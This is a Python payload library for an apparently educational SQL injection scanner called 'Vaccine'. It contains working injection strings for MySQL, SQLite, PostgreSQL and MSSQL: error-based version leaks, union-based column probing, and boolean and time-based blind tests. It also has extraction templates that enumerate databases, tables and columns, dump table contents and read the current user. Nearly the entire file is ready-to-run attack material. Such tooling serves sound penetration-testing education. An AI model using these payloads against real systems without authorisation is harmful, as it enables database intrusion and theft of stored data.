#!/usr/bin/env python3

# ---------------------------------------------------------------------------
# Payload library for Vaccine — educational SQL injection tester
#
# Structure:
#   PAYLOADS[injection_type][db_engine] = list of payload dicts
#
# Each payload dict:
#   {
#     "raw":      str  — the raw SQL fragment injected into the parameter
#     "detect":   list[str] — strings to look for in the response body
#                             (for error-based and union-based detection)
#     "true_str": str  — (boolean only) string expected in TRUE response
#     "sleep":    int  — (time only) seconds to sleep; detect by timing
#   }
#
# Supported injection types:  union | error | boolean | time
# Supported DB engines:       mysql | sqlite | postgresql | mssql
# ---------------------------------------------------------------------------

# ── Fingerprinting signatures ───────────────────────────────────────────────
# Used by fingerprint.py to identify the DB engine from error responses.

DB_FINGERPRINTS = {
    "mysql": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql_fetch",
        "mysql_num_rows",
        "supplied argument is not a valid mysql",
        "com.mysql.jdbc",
        "SQLSTATE[HY000]",
        "mysqli_",
    ],
    "sqlite": [
        "sqlite3::",
        "sqliteexception",
        "sqlite_master",
        "no such table",
        "unrecognized token",
        "sqlite error",
    ],
    "postgresql": [
        "pg_query()",
        "psqlexception",
        "pg_exec()",
        "postgresql query failed",
        "error: syntax error at or near",
        "org.postgresql.util",
        "pdo_pgsql",
    ],
    "mssql": [
        "microsoft ole db provider for sql server",
        "odbc sql server driver",
        "incorrect syntax near",
        "sqlsrv_query()",
        "mssql_query()",
        "unclosed quotation mark after the character string",
        "microsoft sql native client error",
    ],
}

# ── Error-based payloads ────────────────────────────────────────────────────
# Inject a malformed fragment → force the DB to expose itself in an error.

_ERROR_PAYLOADS = {
    "mysql": [
        {
            "raw": "'",
            "detect": [
                "you have an error in your sql syntax",
                "warning: mysql",
                "SQLSTATE",
            ],
        },
        {
            # extractvalue() trick — forces error containing DB version
            "raw": "' AND extractvalue(1,concat(0x7e,version()))-- -",
            "detect": ["xpath syntax error", "~"],
        },
        {
            # updatexml() alternative
            "raw": "' AND updatexml(1,concat(0x7e,database()),1)-- -",
            "detect": ["xpath syntax error", "~"],
        },
    ],
    "sqlite": [
        {
            "raw": "'",
            "detect": [
                "sqlite3::",
                "sqliteexception",
                "unrecognized token",
                "sqlite error",
                "no such table",
            ],
        },
        {
            # SQLite doesn't have extractvalue; force type error via CAST
            "raw": "' AND CAST((SELECT sqlite_version()) AS INTEGER)-- -",
            "detect": ["datatype mismatch", "sqlite3::"],
        },
    ],
    "postgresql": [
        {
            "raw": "'",
            "detect": [
                "pg_query()",
                "psqlexception",
                "error: syntax error",
                "pdo_pgsql",
            ],
        },
        {
            # Force a conversion error leaking version info
            "raw": "' AND CAST(version() AS INTEGER)-- -",
            "detect": ["invalid input syntax for type integer", "psqlexception"],
        },
    ],
    "mssql": [
        {
            "raw": "'",
            "detect": [
                "incorrect syntax near",
                "unclosed quotation mark",
                "microsoft ole db",
                "sqlsrv_query",
            ],
        },
        {
            # MSSQL CONVERT trick to leak version in error
            "raw": "' AND CONVERT(int, @@version)-- -",
            "detect": [
                "conversion failed when converting",
                "microsoft ole db",
            ],
        },
    ],
}

# ── Union-based payloads ────────────────────────────────────────────────────
# Probe for the number of columns (1..10), then inject UNION SELECT to leak data.
# The scanner will iterate col counts; these are templates with {cols} placeholder
# replaced by "NULL,NULL,..." of the correct arity.

_UNION_PAYLOADS = {
    "mysql": [
        {
            # Step 1: probe column count with ORDER BY
            "raw": "' ORDER BY {n}-- -",
            "detect": ["unknown column", "order by"],  # error means n is too high
            "type": "probe_order",
        },
        {
            # Step 2: actual UNION injection — {cols} = "NULL,NULL,..."
            "raw": "' UNION SELECT {cols}-- -",
            "detect": ["__VACCINE_CANARY__"],
            "type": "union",
        },
        {
            # With a canary string in one column
            "raw": "' UNION SELECT {cols_with_canary}-- -",
            "detect": ["__VACCINE_CANARY__"],
            "type": "union_canary",
        },
    ],
    "sqlite": [
        {
            "raw": "' ORDER BY {n}-- -",
            "detect": ["1st order by term out of range"],
            "type": "probe_order",
        },
        {
            "raw": "' UNION SELECT {cols}-- -",
            "detect": ["__VACCINE_CANARY__"],
            "type": "union",
        },
        {
            "raw": "' UNION SELECT {cols_with_canary}-- -",
            "detect": ["__VACCINE_CANARY__"],
            "type": "union_canary",
        },
    ],
    "postgresql": [
        {
            "raw": "' ORDER BY {n}-- -",
            "detect": ["position {n} is not in select list"],
            "type": "probe_order",
        },
        {
            # PG requires NULL casting to avoid type mismatch
            "raw": "' UNION SELECT {cols}-- -",
            "detect": ["__VACCINE_CANARY__"],
            "type": "union",
        },
        {
            "raw": "' UNION SELECT {cols_with_canary}-- -",
            "detect": ["__VACCINE_CANARY__"],
            "type": "union_canary",
        },
    ],
    "mssql": [
        {
            "raw": "' ORDER BY {n}-- -",
            "detect": ["the order by position number {n} is out of range"],
            "type": "probe_order",
        },
        {
            "raw": "' UNION SELECT {cols}-- -",
            "detect": ["__VACCINE_CANARY__"],
            "type": "union",
        },
        {
            "raw": "' UNION SELECT {cols_with_canary}-- -",
            "detect": ["__VACCINE_CANARY__"],
            "type": "union_canary",
        },
    ],
}

# ── Boolean-based payloads ──────────────────────────────────────────────────
# Send a TRUE condition and a FALSE condition; compare response length/content.
# If len(true_response) != len(false_response) → injectable.

_BOOLEAN_PAYLOADS = {
    "mysql": [
        {
            "true":  "' AND 1=1-- -",
            "false": "' AND 1=2-- -",
        },
        {
            "true":  "' AND 'a'='a'-- -",
            "false": "' AND 'a'='b'-- -",
        },
    ],
    "sqlite": [
        {
            "true":  "' AND 1=1-- -",
            "false": "' AND 1=2-- -",
        },
        {
            "true":  "' AND 'x'='x'-- -",
            "false": "' AND 'x'='y'-- -",
        },
    ],
    "postgresql": [
        {
            "true":  "' AND 1=1-- -",
            "false": "' AND 1=2-- -",
        },
        {
            "true":  "' AND TRUE-- -",
            "false": "' AND FALSE-- -",
        },
    ],
    "mssql": [
        {
            "true":  "' AND 1=1-- -",
            "false": "' AND 1=2-- -",
        },
        {
            "true":  "' AND 'a'='a'-- -",
            "false": "' AND 'a'='b'-- -",
        },
    ],
}

# ── Time-based (blind) payloads ─────────────────────────────────────────────
# Inject a sleep/delay; if response time >= threshold → injectable.
# `sleep` = seconds to delay (used to set requester timeout + threshold).

_TIME_PAYLOADS = {
    "mysql": [
        {
            "raw":   "' AND SLEEP(5)-- -",
            "sleep": 5,
        },
        {
            "raw":   "'; CALL SLEEP(5)-- -",
            "sleep": 5,
        },
    ],
    "sqlite": [
        {
            # SQLite has no native SLEEP; use a heavy recursive CTE as a delay trick
            "raw": (
                "' AND 1=(WITH RECURSIVE r(i) AS "
                "(SELECT 1 UNION ALL SELECT i+1 FROM r WHERE i<5000000) "
                "SELECT i FROM r ORDER BY i DESC LIMIT 1)-- -"
            ),
            "sleep": 3,
        },
    ],
    "postgresql": [
        {
            "raw":   "'; SELECT pg_sleep(5)-- -",
            "sleep": 5,
        },
        {
            "raw":   "' AND 1=(SELECT 1 FROM pg_sleep(5))-- -",
            "sleep": 5,
        },
    ],
    "mssql": [
        {
            "raw":   "'; WAITFOR DELAY '0:0:5'-- -",
            "sleep": 5,
        },
        {
            "raw":   "' AND 1=1; WAITFOR DELAY '0:0:5'-- -",
            "sleep": 5,
        },
    ],
}

# ── Data extraction queries ─────────────────────────────────────────────────
# Templates used by extractor.py after a vulnerability is confirmed.
# {injectable_col} = the column index (1-based) that reflects output in the page.

EXTRACTION_QUERIES = {
    "mysql": {
        "databases":    "SELECT GROUP_CONCAT(schema_name SEPARATOR '|') FROM information_schema.schemata",
        "tables":       "SELECT GROUP_CONCAT(table_name SEPARATOR '|') FROM information_schema.tables WHERE table_schema=database()",
        "columns":      "SELECT GROUP_CONCAT(column_name SEPARATOR '|') FROM information_schema.columns WHERE table_name='{table}'",
        "dump":         "SELECT GROUP_CONCAT({cols} SEPARATOR '|') FROM {table}",
        "version":      "SELECT version()",
        "current_db":   "SELECT database()",
        "current_user": "SELECT user()",
    },
    "sqlite": {
        "databases":    "SELECT 'main'",  # SQLite has no multi-DB concept; always 'main'
        "tables":       "SELECT GROUP_CONCAT(name,'|') FROM sqlite_master WHERE type='table'",
        "columns":      "SELECT GROUP_CONCAT(name,'|') FROM pragma_table_info('{table}')",
        "dump":         "SELECT GROUP_CONCAT({cols},'|') FROM {table}",
        "version":      "SELECT sqlite_version()",
        "current_db":   "SELECT 'main'",
        "current_user": "SELECT 'N/A'",
    },
    "postgresql": {
        "databases":    "SELECT string_agg(datname,'|') FROM pg_database",
        "tables":       "SELECT string_agg(tablename,'|') FROM pg_tables WHERE schemaname='public'",
        "columns":      "SELECT string_agg(column_name,'|') FROM information_schema.columns WHERE table_name='{table}'",
        "dump":         "SELECT string_agg({cols}::text,'|') FROM {table}",
        "version":      "SELECT version()",
        "current_db":   "SELECT current_database()",
        "current_user": "SELECT current_user",
    },
    "mssql": {
        "databases":    "SELECT STRING_AGG(name,'|') FROM sys.databases",
        "tables":       "SELECT STRING_AGG(TABLE_NAME,'|') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'",
        "columns":      "SELECT STRING_AGG(COLUMN_NAME,'|') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table}'",
        "dump":         "SELECT STRING_AGG(CAST({cols} AS NVARCHAR(MAX)),'|') FROM {table}",
        "version":      "SELECT @@version",
        "current_db":   "SELECT DB_NAME()",
        "current_user": "SELECT SYSTEM_USER",
    },
}

# ── Public accessors ────────────────────────────────────────────────────────
# Unified dict imported by scanner.py and extractor.py

PAYLOADS = {
    "error":   _ERROR_PAYLOADS,
    "union":   _UNION_PAYLOADS,
    "boolean": _BOOLEAN_PAYLOADS,
    "time":    _TIME_PAYLOADS,
}

CANARY = "__VACCINE_CANARY__"

SUPPORTED_ENGINES = list(DB_FINGERPRINTS.keys())   # ["mysql","sqlite","postgresql","mssql"]
SUPPORTED_METHODS = list(PAYLOADS.keys())           # ["error","union","boolean","time"]
